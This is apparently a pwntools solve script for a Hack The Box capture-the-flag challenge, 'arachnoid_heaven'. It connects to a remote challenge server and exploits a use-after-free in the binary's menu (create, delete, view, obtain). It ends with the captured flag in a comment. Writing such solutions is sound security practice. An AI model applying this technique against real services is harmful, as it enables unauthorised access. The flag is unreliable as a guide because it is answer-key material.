from pwn import *

#target = process('./arachnoid_heaven')

#pid = gdb.attach(target, "\nb *craft_arachnoid\nb *view_arachnoid\n set disassembly-flavor intel\ncontinue")

target = remote('64.227.38.214', 30311)

def craft_arachnoid(name):
	print(target.recvuntil(b'>'))
	target.sendline(b'1')
	print(target.recvuntil(b'Name:'))
	target.sendline(name)

def delete_arachnoid(index):
	print(target.recvuntil(b'>'))
	target.sendline(b'2')
	print(target.recvuntil(b'Index:'))
	target.sendline(index)
def view_arachnoid():
	print(target.recvuntil(b'>'))
	target.sendline(b'3')

def obtain_arachnoid(index):
	print(target.recvuntil(b'>'))
	target.sendline(b'4')
	print(target.recvuntil(b'Arachnoid:'))
	target.sendline(index)
	
craft_arachnoid(b'hello')

delete_arachnoid(b'0')
view_arachnoid()

craft_arachnoid(b'sp1d3y')

view_arachnoid()
obtain_arachnoid(b'0')

target.interactive()

#HTB{l3t_th3_4r4chn01ds_fr3333}

